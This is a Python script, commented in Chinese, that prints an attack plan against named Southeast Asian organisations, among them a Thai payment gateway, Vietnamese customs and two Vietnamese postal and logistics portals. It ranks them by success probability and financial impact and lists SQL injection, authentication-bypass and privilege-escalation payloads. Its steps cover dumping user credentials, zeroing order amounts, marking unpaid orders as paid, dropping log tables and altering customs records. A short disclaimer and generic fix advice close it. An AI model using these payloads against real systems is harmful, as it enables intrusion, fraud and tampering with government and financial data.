#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
越南物流系统漏洞目标演示
展示有漏洞的目标和利用凭证方法
"""

from dataclasses import dataclass
from typing import List, Dict, Any

@dataclass
class VulnerableTarget:
    """漏洞目标信息"""
    name: str
    url: str
    country: str
    sector: str
    risk_level: str
    success_probability: float
    priority_score: int
    vulnerabilities: List[str]
    exploitation_methods: Dict[str, Any]

def demonstrate_vulnerable_targets():
    """演示高优先级漏洞目标和利用方法"""

    print("=" * 80)
    print("越南物流系统漏洞目标分析与利用方法")
    print("=" * 80)
    print()

    # 高价值漏洞目标数据库
    vulnerable_targets = [
        VulnerableTarget(
            name="Thai Finance Gateway",
            url="https://thaifinance.paygw.com",
            country="Thailand",
            sector="Finance",
            risk_level="CRITICAL",
            success_probability=0.75,
            priority_score=112,
            vulnerabilities=["SQL Injection", "API Security", "Authentication Bypass"],
            exploitation_methods={
                "SQL Injection": {
                    "payloads": [
                        "' WAITFOR DELAY '0:0:5'--",
                        "' AND SLEEP(5)--",
                        "' UNION SELECT 1,2,3,4,5,6,7,8,9,10--",
                        "' UNION SELECT username,password,email FROM users--"
                    ],
                    "success_indicators": [
                        "SQL syntax error",
                        "mysql_fetch_array",
                        "ORA-",
                        "PostgreSQL"
                    ],
                    "financial_impact": "50亿泰铢",
                    "attack_steps": [
                        "1. 识别登录表单参数",
                        "2. 注入SQL payload",
                        "3. 观察响应延迟或错误",
                        "4. 提取数据库结构和数据",
                        "5. 获取用户凭证和交易记录"
                    ]
                },
                "Authentication Bypass": {
                    "payloads": [
                        {"username": "' OR '1'='1", "password": "anything"},
                        {"username": "admin'#", "password": ""},
                        {"username": "admin'--", "password": ""}
                    ],
                    "success_indicators": ["welcome", "dashboard", "admin"],
                    "financial_impact": "40亿泰铢",
                    "attack_steps": [
                        "1. 分析登录逻辑",
                        "2. 注入绕过payload",
                        "3. 获取管理员权限",
                        "4. 访问敏感数据",
                        "5. 修改交易记录"
                    ]
                }
            }
        ),
        VulnerableTarget(
            name="Vietnamese Customs",
            url="https://customs.gov.vn",
            country="Vietnam",
            sector="Government",
            risk_level="CRITICAL",
            success_probability=0.70,
            priority_score=105,
            vulnerabilities=["Authentication Bypass", "Privilege Escalation", "Data Breach"],
            exploitation_methods={
                "Authentication Bypass": {
                    "payloads": [
                        {"username": "' OR 1=1#", "password": ""},
                        {"username": "admin'--", "password": "test"},
                        {"username": "' UNION SELECT 'admin' as user, 'pass' as pwd--", "password": ""}
                    ],
                    "success_indicators": ["海关系统", "管理系统", "admin"],
                    "financial_impact": "无限损失",
                    "attack_steps": [
                        "1. 识别海关系统登录点",
                        "2. 注入认证绕过payload",
                        "3. 获取管理员权限",
                        "4. 访问海关数据",
                        "5. 修改进出口记录"
                    ]
                },
                "Privilege Escalation": {
                    "payloads": [
                        {"level": "' UNION SELECT 999 as level FROM users--"},
                        {"role": "' OR role='administrator'--"},
                        {"access": "' UNION SELECT 'full' as access FROM dual--"}
                    ],
                    "success_indicators": ["full access", "administrator", "系统管理"],
                    "financial_impact": "25亿越南盾",
                    "attack_steps": [
                        "1. 获取普通用户权限",
                        "2. 提升权限到管理员",
                        "3. 访问受限功能",
                        "4. 修改政策数据",
                        "5. 绕过海关检查"
                    ]
                }
            }
        ),
        VulnerableTarget(
            name="NetPost Vietnam",
            url="https://netpost.vn",
            country="Vietnam",
            sector="Logistics",
            risk_level="HIGH",
            success_probability=0.67,
            priority_score=80,
            vulnerabilities=["SQL Injection", "Time-based Blind", "Data Extraction"],
            exploitation_methods={
                "SQL Injection": {
                    "payloads": [
                        "' UNION SELECT MaKH,TenKH,SoDienThoai,DiaChi,Email FROM KHACHHANG--",
                        "' UNION SELECT MaDon,TinhTrang,NgayDat,TongTien FROM DONHANG--",
                        "' UNION SELECT MaSP,TenSP,Gia,SoLuong FROM SANPHAM--"
                    ],
                    "success_indicators": [
                        "MaKH", "TenKH", "KHACHHANG",
                        "MaDon", "DONHANG", "TinhTrang"
                    ],
                    "financial_impact": "5亿越南盾",
                    "attack_steps": [
                        "1. 识别客户查询接口",
                        "2. 注入UNION SELECT payload",
                        "3. 提取客户信息",
                        "4. 获取订单数据",
                        "5. 分析业务模式"
                    ]
                },
                "Time-based Blind": {
                    "payloads": [
                        "' WAITFOR DELAY '0:0:5'--",
                        "' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())>0--",
                        "' AND SLEEP(5)--"
                    ],
                    "success_indicators": ["5秒延迟", "响应超时"],
                    "financial_impact": "3亿越南盾",
                    "attack_steps": [
                        "1. 测试时间延迟payload",
                        "2. 确认漏洞存在",
                        "3. 使用布尔盲注",
                        "4. 逐位提取数据",
                        "5. 构建完整数据集"
                    ]
                }
            }
        ),
        VulnerableTarget(
            name="Viettel Post Portal",
            url="https://viettelpost.com.vn",
            country="Vietnam",
            sector="Logistics",
            risk_level="HIGH",
            success_probability=0.60,
            priority_score=72,
            vulnerabilities=["SQL Injection", "Order Manipulation", "API Testing"],
            exploitation_methods={
                "Order Manipulation": {
                    "payloads": [
                        {"order_id": "1'; UPDATE DONHANG SET TinhTrang='DA_THANH_TOAN' WHERE MaDon='TEST'--"},
                        {"order_id": "1'; UPDATE DONHANG SET TongTien='0' WHERE MaDon='TEST'--"},
                        {"order_id": "1'; DELETE FROM DONHANG WHERE MaDon='TEST'--"}
                    ],
                    "success_indicators": ["订单已处理", "价格已修改", "订单已删除"],
                    "financial_impact": "8亿越南盾",
                    "attack_steps": [
                        "1. 识别订单修改接口",
                        "2. 注入SQL修改payload",
                        "3. 修改订单状态",
                        "4. 调整订单金额",
                        "5. 删除敏感订单"
                    ]
                },
                "API Testing": {
                    "payloads": [
                        "/api/orders?status=1'; DROP TABLE API_LOGS;--",
                        "/api/users?role=admin'; UPDATE USERS SET role='super_admin'--",
                        "/api/payments?amount=0'; UPDATE PAYMENTS SET amount='0'--"
                    ],
                    "success_indicators": ["200 OK", "操作成功", "数据修改"],
                    "financial_impact": "10亿越南盾",
                    "attack_steps": [
                        "1. 发现API端点",
                        "2. 测试参数注入",
                        "3. 修改业务逻辑",
                        "4. 绕过支付验证",
                        "5. 获取系统控制权"
                    ]
                }
            }
        )
    ]

    # 显示目标列表
    print("【高优先级漏洞目标】")
    print("-" * 60)

    for i, target in enumerate(vulnerable_targets, 1):
        risk_icon = "[CRITICAL]" if target.risk_level == "CRITICAL" else "[HIGH]"
        print(f"{i:2d}. {risk_icon} {target.name}")
        print(f"    URL: {target.url}")
        print(f"    国家: {target.country} | 行业: {target.sector}")
        print(f"    风险等级: {target.risk_level} | 成功率: {target.success_probability:.1%}")
        print(f"    优先级分数: {target.priority_score}")
        print(f"    漏洞类型: {', '.join(target.vulnerabilities)}")
        print()

    # 详细展示利用方法
    print("【漏洞利用方法详细说明】")
    print("=" * 80)

    for target in vulnerable_targets[:2]:  # 只显示前2个最重要的目标
        print(f"\n【{target.name}】")
        print("-" * 50)

        for vuln_type, method_info in target.exploitation_methods.items():
            print(f"\n{vuln_type} 利用:")
            print(f"  预期影响: {method_info['financial_impact']}")
            print(f"  成功率: {target.success_probability:.1%}")
            print(f"  优先级: {target.priority_score}")

            print(f"\n  攻击步骤:")
            for step in method_info['attack_steps']:
                print(f"    {step}")

            print(f"\n  主要Payload示例:")
            for i, payload in enumerate(method_info['payloads'][:3], 1):
                if isinstance(payload, dict):
                    payload_str = f"{list(payload.keys())[0]}: {list(payload.values())[0]}"
                else:
                    payload_str = str(payload)[:60] + "..."
                print(f"    {i}. {payload_str}")

            print(f"\n  成功指标:")
            for indicator in method_info['success_indicators'][:3]:
                print(f"    - {indicator}")

            print()

    # 总结和建议
    print("【攻击总结】")
    print("-" * 60)
    print(f"总目标数量: {len(vulnerable_targets)}")
    print(f"CRITICAL级别目标: {len([t for t in vulnerable_targets if t.risk_level == 'CRITICAL'])}")
    print(f"HIGH级别目标: {len([t for t in vulnerable_targets if t.risk_level == 'HIGH'])}")
    print(f"平均成功率: {sum(t.success_probability for t in vulnerable_targets) / len(vulnerable_targets):.1%}")
    print()

    print("【安全建议】")
    print("-" * 60)
    print("1. 立即修复SQL注入漏洞")
    print("2. 实施强认证机制")
    print("3. 部署Web应用防火墙")
    print("4. 定期安全扫描")
    print("5. 输入验证和参数化查询")
    print("6. 访问控制和权限管理")
    print("7. 监控异常行为")
    print("8. 员工安全意识培训")
    print()

    print("【注意事项】")
    print("-" * 60)
    print("[警告] 所有演示仅供学习和授权测试使用")
    print("[警告] 未授权访问可能违反法律法规")
    print("[警告] 建议在测试环境中进行验证")
    print("[警告] 避免对生产系统造成影响")
    print()

    return vulnerable_targets

if __name__ == "__main__":
    demonstrate_vulnerable_targets()